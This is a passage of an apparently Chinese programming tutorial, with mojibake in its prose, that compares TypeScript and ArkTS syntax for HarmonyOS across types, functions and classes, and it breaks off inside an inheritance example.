data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">HarmonyOSé€‰æ‹©ArkTSçš„åŸå› </h2>
<ol>
<li>
<p><strong>TypeScriptè¶…é›†</strong>ï¼šArkTSæ˜¯TypeScriptçš„è¶…é›†ï¼Œä¿ç•™äº†TypeScriptçš„æ ¸å¿ƒç‰¹æ€§ï¼Œé™ä½äº†å¼€å‘è€…çš„å­¦ä¹ æˆæœ¬ï¼Œä½¿å¾—ç†Ÿæ‚‰TypeScriptçš„å¼€å‘è€…èƒ½å¤Ÿå¿«é€Ÿä¸Šæ‰‹ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šArkTSé’ˆå¯¹é¸¿è’™ç³»ç»Ÿè¿›è¡Œäº†æ·±åº¦ä¼˜åŒ–ï¼Œæä¾›äº†æ›´å¥½çš„è¿è¡Œæ—¶æ€§èƒ½å’Œæ›´ä½çš„å†…å­˜å è€—ï¼Œç‰¹åˆ«æ˜¯åœ¨å£°æ˜å¼UIæ¡†æ¶ArkUIä¸­è¡¨ç°å‡ºè‰²ã€‚</p>
</li>
<li>
<p><strong>ç±»å‹å®‰å…¨å¢å¼º</strong>ï¼šç›¸æ¯”TypeScriptï¼ŒArkTSè¿›ä¸€æ­¥å¼ºåŒ–äº†ç±»å‹ç³»ç»Ÿï¼Œç¦ç”¨äº†ä¸€äº›åŠ¨æ€ç‰¹æ€§ï¼ˆå¦‚anyç±»å‹çš„éƒ¨åˆ†ç”¨æ³•ï¼‰ï¼Œæä¾›æ›´ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œå‡å°‘è¿è¡Œæ—¶é”™è¯¯ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿæ€æ•´åˆ</strong>ï¼šArkTSä¸é¸¿è’™ç”Ÿæ€æ·±åº¦é›†æˆï¼Œæä¾›äº†ä¸°å¯Œçš„ç³»ç»ŸAPIå’Œç»„ä»¶åº“ï¼Œèƒ½å¤Ÿå……åˆ†å‘æŒ¥é¸¿è’™ç³»ç»Ÿçš„åˆ†å¸ƒå¼èƒ½åŠ›å’Œè·¨è®¾å¤‡ååŒç‰¹æ€§ã€‚</p>
</li>
</ol>
<h2 data-id="heading-1">åŸºç¡€è¯­æ³•</h2>
<h3 data-id="heading-2">ç¨‹åºå…¥å£</h3>
<p><strong>TypeScript:</strong></p>
<p>TypeScript/JavaScriptåº”ç”¨é€šå¸¸æ²¡æœ‰å›ºå®šçš„ç¨‹åºå…¥å£ï¼Œåœ¨Node.jsç¯å¢ƒä¸­ä¼šä»package.jsonæŒ‡å®šçš„å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œï¼Œåœ¨æµè§ˆå™¨ç¯å¢ƒä¸­åˆ™ä»HTMLå¼•å…¥çš„è„šæœ¬å¼€å§‹æ‰§è¡Œã€‚</p>
<p><strong>ArkTS:</strong></p>
<p>ArkTSåº”ç”¨æœ‰æ˜ç¡®çš„å…¥å£ç‚¹ï¼Œé€šå¸¸åœ¨<code>entry/src/main/ets/entryability/EntryAbility.ets</code>æ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">UIAbility</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.app.ability.UIAbility'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-variable language_">window</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.window'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntryAbility</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">UIAbility</span> {
  <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">want, launchParam</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Ability onCreate'</span>);
  }

  <span class="hljs-title function_">onWindowStageCreate</span>(<span class="hljs-params">windowStage: <span class="hljs-variable language_">window</span>.WindowStage</span>) {
    windowStage.<span class="hljs-title function_">loadContent</span>(<span class="hljs-string">'pages/Index'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
      <span class="hljs-comment">// åŠ è½½é¡µé¢</span>
    });
  }
}
</code></pre>
<p>é¡µé¢å…¥å£é€šå¸¸åœ¨<code>pages/Index.ets</code>ä¸­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// UIæ„å»º</span>
  }
}
</code></pre>
<h3 data-id="heading-3">æ•°æ®ç±»å‹</h3>
<h4 data-id="heading-4">åŸºæœ¬ç±»å‹</h4>
<p><strong>TypeScriptä¸ArkTSå…±åŒæ”¯æŒçš„ç±»å‹ï¼š</strong></p>
<ul>
<li><code>boolean</code>: å¸ƒå°”ç±»å‹</li>
<li><code>number</code>: æ•°å­—ç±»å‹</li>
<li><code>string</code>: å­—ç¬¦ä¸²ç±»å‹</li>
<li><code>null</code>: ç©ºå€¼</li>
<li><code>undefined</code>: æœªå®šä¹‰</li>
<li><code>bigint</code>: å¤§æ•´æ•°ï¼ˆES2020+ï¼‰</li>
<li><code>symbol</code>: ç¬¦å·ç±»å‹</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript &amp; ArkTS</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">isDone</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"HarmonyOS"</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">big</span>: <span class="hljs-built_in">bigint</span> = <span class="hljs-number">100n</span>;
</code></pre>
<h4 data-id="heading-5">Arrayï¼ˆæ•°ç»„ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">list1</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">list2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¨èä½¿ç”¨ç±»å‹æ³¨è§£</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">list1</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">list2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];

<span class="hljs-comment">// ArkTSä¸­æ•°ç»„æ“ä½œä¸TSåŸºæœ¬ä¸€è‡´</span>
list1.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>);
list1.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item.<span class="hljs-title function_">toString</span>());
});
</code></pre>
<h4 data-id="heading-6">Tupleï¼ˆå…ƒç»„ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">'hello'</span>, <span class="hljs-number">10</span>];
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSåŒæ ·æ”¯æŒå…ƒç»„</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">'hello'</span>, <span class="hljs-number">10</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">first</span>: <span class="hljs-built_in">string</span> = tuple[<span class="hljs-number">0</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">second</span>: <span class="hljs-built_in">number</span> = tuple[<span class="hljs-number">1</span>];
</code></pre>
<h4 data-id="heading-7">Enumï¼ˆæšä¸¾ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> {
  <span class="hljs-title class_">Red</span>,
  <span class="hljs-title class_">Green</span>,
  <span class="hljs-title class_">Blue</span>
}

<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Status</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-string">'SUCCESS'</span>,
  <span class="hljs-title class_">Fail</span> = <span class="hljs-string">'FAIL'</span>
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒæ•°å­—æšä¸¾å’Œå­—ç¬¦ä¸²æšä¸¾</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> {
  <span class="hljs-title class_">Red</span>,
  <span class="hljs-title class_">Green</span>,
  <span class="hljs-title class_">Blue</span>
}

<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Status</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-string">'SUCCESS'</span>,
  <span class="hljs-title class_">Fail</span> = <span class="hljs-string">'FAIL'</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">color</span>: <span class="hljs-title class_">Color</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>;
</code></pre>
<h4 data-id="heading-8">any å’Œ unknown</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">notSure</span>: <span class="hljs-built_in">any</span> = <span class="hljs-number">4</span>;
notSure = <span class="hljs-string">"maybe a string"</span>;
notSure = <span class="hljs-literal">false</span>;

<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">unknown</span> = <span class="hljs-number">4</span>;
<span class="hljs-comment">// unknownç±»å‹æ›´å®‰å…¨ï¼Œä½¿ç”¨å‰éœ€è¦ç±»å‹æ£€æŸ¥</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>());
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSé™åˆ¶äº†anyçš„ä½¿ç”¨ï¼Œæ¨èä½¿ç”¨å…·ä½“ç±»å‹</span>
<span class="hljs-comment">// åœ¨æŸäº›åœºæ™¯ä¸‹å¯ä»¥ä½¿ç”¨ï¼Œä½†ä¼šæœ‰ç¼–è¯‘è­¦å‘Š</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">notSure</span>: <span class="hljs-built_in">any</span> = <span class="hljs-number">4</span>; <span class="hljs-comment">// ä¸æ¨è</span>

<span class="hljs-comment">// æ¨èä½¿ç”¨è”åˆç±»å‹æ›¿ä»£</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> = <span class="hljs-number">4</span>;
value = <span class="hljs-string">"string"</span>;
</code></pre>
<h4 data-id="heading-9">Objectï¼ˆå¯¹è±¡ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  email?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// å¯é€‰å±æ€§</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Zhang San'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä¸­æ¥å£å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  email?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Zhang San'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};

<span class="hljs-comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨class</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonClass</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
}
</code></pre>
<h3 data-id="heading-10">å˜é‡å£°æ˜</h3>
<h4 data-id="heading-11">letã€constã€var</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">var</span> oldStyle = <span class="hljs-string">'avoid using var'</span>; <span class="hljs-comment">// ä¸æ¨è</span>
<span class="hljs-keyword">let</span> mutableValue = <span class="hljs-string">'can change'</span>;
<span class="hljs-keyword">const</span> immutableValue = <span class="hljs-string">'cannot change'</span>;
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSåŒæ ·æ”¯æŒletå’Œconstï¼Œä¸æ¨èä½¿ç”¨var</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">mutableValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'can change'</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">immutableValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'cannot change'</span>;

<span class="hljs-comment">// ArkTSå¼ºåˆ¶è¦æ±‚ç±»å‹æ³¨è§£ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ¨èæ˜ç¡®æŒ‡å®šç±»å‹</span>
</code></pre>
<h4 data-id="heading-12">ç±»å‹æ¨æ–­</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> message = <span class="hljs-string">"Hello"</span>; <span class="hljs-comment">// æ¨æ–­ä¸ºstringç±»å‹</span>
<span class="hljs-keyword">let</span> count = <span class="hljs-number">42</span>; <span class="hljs-comment">// æ¨æ–­ä¸ºnumberç±»å‹</span>
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç±»å‹æ¨æ–­ï¼Œä½†æ›´æ¨èæ˜¾å¼å£°æ˜</span>
<span class="hljs-keyword">let</span> message = <span class="hljs-string">"Hello"</span>; <span class="hljs-comment">// å¯ä»¥æ¨æ–­</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">42</span>; <span class="hljs-comment">// æ¨èæ˜¾å¼å£°æ˜</span>
</code></pre>
<h3 data-id="heading-13">å‡½æ•°</h3>
<h4 data-id="heading-14">å‡½æ•°å£°æ˜</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å‡½æ•°å£°æ˜</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// å‡½æ•°è¡¨è¾¾å¼</span>
<span class="hljs-keyword">const</span> multiply = <span class="hljs-keyword">function</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-comment">// ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> subtract = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a - b;
};

<span class="hljs-comment">// ç®€å†™ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> divide = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a / b;
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç›¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">const</span> multiply = <span class="hljs-keyword">function</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-keyword">const</span> subtract = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a - b;
};

<span class="hljs-keyword">const</span> divide = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a / b;
</code></pre>
<h4 data-id="heading-15">å¯é€‰å‚æ•°å’Œé»˜è®¤å‚æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">buildName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">if</span> (lastName) {
    <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
  }
  <span class="hljs-keyword">return</span> firstName;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildFullName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Smith"</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä¸­å¯é€‰å‚æ•°å’Œé»˜è®¤å‚æ•°ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">if</span> (lastName) {
    <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
  }
  <span class="hljs-keyword">return</span> firstName;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildFullName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Smith"</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
}
</code></pre>
<h4 data-id="heading-16">å‰©ä½™å‚æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...numbers: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}

<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 10</span>
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒå‰©ä½™å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...numbers: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-17">ç±»</h3>
<h4 data-id="heading-18">ç±»çš„å®šä¹‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Zhang San"</span>, <span class="hljs-number">25</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSç±»å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Zhang San"</span>, <span class="hljs-number">25</span>);
</code></pre>
<h4 data-id="heading-19">è®¿é—®ä¿®é¥°ç¬¦</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;      <span class="hljs-comment">// å…¬å…±å±æ€§</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;      <span class="hljs-comment">// ç§æœ‰å±æ€§</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;   <span class="hljs-comment">// å—ä¿æŠ¤å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-keyword">type</span>;
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getAge</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>;
  }
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç›¸åŒçš„è®¿é—®ä¿®é¥°ç¬¦</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-keyword">type</span>;
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getAge</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>;
  }
}
</code></pre>
<h4 data-id="heading-20">ç»§æ‰¿</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">move</span>(<span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> moved <span class="hljs-subst">${distance}</span>m.`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span> {
